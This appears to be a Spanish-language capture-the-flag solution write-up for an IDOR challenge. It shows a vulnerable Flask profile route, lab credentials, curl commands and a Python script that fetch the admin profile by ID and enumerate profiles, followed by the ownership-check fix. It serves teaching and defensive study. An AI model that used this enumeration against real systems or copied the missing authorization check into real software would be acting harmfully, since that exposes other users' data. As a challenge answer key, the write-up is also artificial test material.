# Solución Reto 10: IDOR — Insecure Direct Object Reference (ctf-idor)

## Descripción

El portal permite ver perfiles por ID numérico en la URL `/profile/<id>`. El endpoint autentica correctamente (requiere sesión activa), pero **no verifica que el ID solicitado corresponda al usuario autenticado**:

```python
@app.route("/profile/<int:uid>")
def profile(uid):
    if "user_id" not in session:
        return redirect("/")
    user_data = USERS.get(uid)   # sin comprobar uid == session["user_id"]
    ...
```

La flag está en las notas del usuario `admin` (ID 3).

## Explotación

### 1. Iniciar sesión con cualquier cuenta pública

Credenciales disponibles en la UI:
- `alice / password123`
- `bob / qwerty456`

```bash
curl -c cookies.txt -X POST http://<HOST>:<PORT>/login \
  -d "username=alice&password=password123"
```

### 2. Acceder al perfil del administrador (ID 3)

```bash
curl -b cookies.txt http://<HOST>:<PORT>/profile/3
```

La respuesta contiene el perfil del usuario `admin` con su campo **Notas** que incluye la flag.

### 3. Enumeración de todos los perfiles

```bash
for i in 1 2 3 4; do
  echo "=== Perfil $i ==="
  curl -s -b cookies.txt "http://<HOST>:<PORT>/profile/$i" | grep -oE 'CTF\{[^}]+\}'
done
```

## Script de explotación

```python
import urllib.request, urllib.parse, re, http.cookiejar

TARGET = "http://<HOST>:<PORT>"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

# Login
data = urllib.parse.urlencode({"username": "alice", "password": "password123"}).encode()
opener.open(f"{TARGET}/login", data)

# IDOR: acceder al perfil del admin (ID=3)
html = opener.open(f"{TARGET}/profile/3").read().decode()
match = re.search(r'CTF\{[^}]+\}', html)
if match:
    print("Flag:", match.group())
```

## Causa raíz

El servidor confía en el parámetro de la URL sin compararlo con la identidad de la sesión:

```python
# Fix correcto
if uid != session["user_id"]:
    abort(403)
```

## Flag

```
CTF{...}   ← notas del usuario admin en /profile/3
```
